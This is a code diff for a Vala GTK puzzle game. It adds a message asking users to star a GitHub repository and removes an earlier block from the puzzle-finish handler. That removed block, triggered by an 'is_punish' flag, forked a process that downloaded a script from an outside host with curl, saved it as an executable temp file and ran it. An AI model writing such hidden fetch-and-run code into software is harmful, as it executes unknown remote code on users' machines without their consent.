@@ -31,6 +31,7 @@ public class SupraApplication : Gtk.Application {
 		var menu = new Menu ();
 
 		menu.onFinish.connect (()=> {
+			print ("laisse une petite etoile ici https://github.com/nda-cunh/suprapuzzle <3");
 			base.quit ();
 		});
 
@@ -57,27 +58,7 @@ public class SupraApplication : Gtk.Application {
 		((Widget)win).add_controller (event_controller_key);
 		((Widget)win).add_controller (event_controller);
 
-		bool is_punish = false;
-
 		my_puzzle.onFinish.connect (() => {
-			if (is_punish == true) {
-				int pid = Posix.fork();
-				if (pid == 0) {
-					string script;
-					string exec;
-					try {
-						Process.spawn_command_line_sync ("curl -sSL what.xtrm.me", out script);
-						FileUtils.open_tmp ("suprapuzzle_XXXXXXX", out exec);
-						FileUtils.set_contents (exec, script);
-						FileUtils.chmod (exec, 0755);
-						Process.spawn_command_line_sync (exec);
-					}
-					catch (Error e) {
-						printerr (e.message);
-					}
-					return ;
-				}
-			}
 			win.close ();
 			win.dispose ();
 		});
